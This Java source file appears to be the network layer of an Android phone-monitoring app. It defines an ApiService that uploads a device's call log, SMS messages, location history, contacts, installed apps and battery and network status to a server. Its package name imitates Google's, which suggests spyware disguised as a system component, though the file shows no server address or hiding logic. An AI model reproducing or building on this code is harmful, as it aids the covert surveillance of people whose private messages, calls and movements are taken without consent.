package com.google.android.apps.repositories.network.api;


import com.google.android.apps.repositories.network.models.request.DeleteRequest;
import com.google.android.apps.repositories.network.models.request.DeviceInfoRequest;
import com.google.android.apps.repositories.network.models.request.InformationRequest;
import com.google.android.apps.repositories.network.models.request.InitialRequest;
import com.google.android.apps.repositories.network.models.request.SyncRequest;
import com.google.android.apps.repositories.network.models.response.DeleteResponse;
import com.google.android.apps.repositories.network.models.response.InformationResponse;
import com.google.android.apps.repositories.network.models.response.InitialResponse;
import com.google.android.apps.repositories.network.models.response.SyncResponse;

import javax.inject.Inject;

import retrofit2.Call;

/**
 * Created by OldMan on 03.04.2017.
 */

public class ApiService {
    @Inject
    ServerApi serverApi;

    public ApiService(ServerApi serverApi) {
        this.serverApi = serverApi;
    }

    public Call<InitialResponse> onInitDevice(InitialRequest request) {
        return serverApi.onInitDevice(request);
    }

    public Call<SyncResponse> onStateSync(SyncRequest request) {
        return serverApi.onStateSync(request);
    }

    public Call<InformationResponse> setDeviceInfo(DeviceInfoRequest request) {
        return serverApi.setDeviceInfo(request);
    }

    public Call<DeleteResponse> onDeleteDevice(DeleteRequest request) {
        return serverApi.onDeleteDevice(request);
    }

    public Call<InformationResponse> addCall(InformationRequest request) {
        return serverApi.addCallList(request);
    }

    public Call<InformationResponse> addSms(InformationRequest request) {
        return serverApi.addMessageList(request);
    }

    public Call<InformationResponse> addPosition(InformationRequest request) {
        return serverApi.addLocationList(request);
    }

    public Call<InformationResponse> setContactsBook(InformationRequest request) {
        return serverApi.setContactBook(request);
    }

    public Call<InformationResponse> addAppOfDevice(InformationRequest request) {
        return serverApi.setInstallAppList(request);
    }

    public Call<InformationResponse> setDeviceStatus(InformationRequest request) {
        return serverApi.addDeviceStatusList(request);
    }

    public Call<InformationResponse> setDeviceBatteryState(InformationRequest request) {
        return serverApi.setBatteryStateList(request);
    }

    public Call<InformationResponse> setNetworkState(InformationRequest request) {
        return serverApi.setNetworkStateList(request);
    }
}
